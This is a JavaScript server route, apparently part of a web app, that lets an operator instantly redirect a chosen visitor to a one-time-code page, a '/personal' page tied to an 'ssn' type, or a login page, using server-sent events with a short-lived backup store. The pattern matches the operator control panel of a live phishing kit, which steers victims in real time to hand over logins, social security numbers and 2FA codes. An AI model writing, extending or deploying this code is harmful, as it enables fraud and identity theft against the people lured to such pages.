// Set redirect command for a visitor
import { broadcastRedirect } from './connections';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { visitorId, redirectType, pagePath } = req.body;
      console.log('[redirect/set] Received redirect request:', { visitorId, redirectType, pagePath });
      
      if (!visitorId || !redirectType) {
        console.error('[redirect/set] Missing required fields');
        return res.status(400).json({ error: 'Visitor ID and redirect type required' });
      }
      
      // Ensure OTP always goes to /otp page
      let finalPagePath = pagePath;
      if (redirectType === 'otp') {
        finalPagePath = '/otp';
      } else if (redirectType === 'ssn') {
        finalPagePath = '/personal';
      } else if (redirectType === 'login') {
        finalPagePath = '/';
      } else {
        finalPagePath = pagePath || '/';
      }
      
      const redirectData = {
        redirect: true,
        redirectType,
        pagePath: finalPagePath,
        timestamp: new Date().toISOString()
      };
      
      console.log('[redirect/set] Redirect data:', redirectData);
      
      // Broadcast instantly via SSE (fastest path)
      console.log('[redirect/set] Broadcasting redirect via SSE for visitor:', visitorId);
      broadcastRedirect(visitorId, redirectData);
      
      // Also store in KV/memory as backup
      try {
        const kv = require('@vercel/kv').kv;
        if (kv) {
          await kv.setex(`redirect:${visitorId}`, 60, JSON.stringify(redirectData)); // 60 second TTL
          console.log('[redirect/set] Stored redirect in KV');
        }
      } catch (error) {
        console.log('[redirect/set] KV not available, using memory store');
        // Fallback to memory store
        if (!global.redirectStore) {
          global.redirectStore = {};
        }
        global.redirectStore[visitorId] = redirectData;
        console.log('[redirect/set] Stored redirect in memory:', global.redirectStore[visitorId]);
        // Auto-delete after 60 seconds
        setTimeout(() => {
          if (global.redirectStore && global.redirectStore[visitorId]) {
            delete global.redirectStore[visitorId];
          }
        }, 60000);
      }
      
      res.status(200).json({ success: true, redirectData });
    } catch (error) {
      console.error('[redirect/set] Error setting redirect:', error);
      res.status(500).json({ error: 'Internal server error', message: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

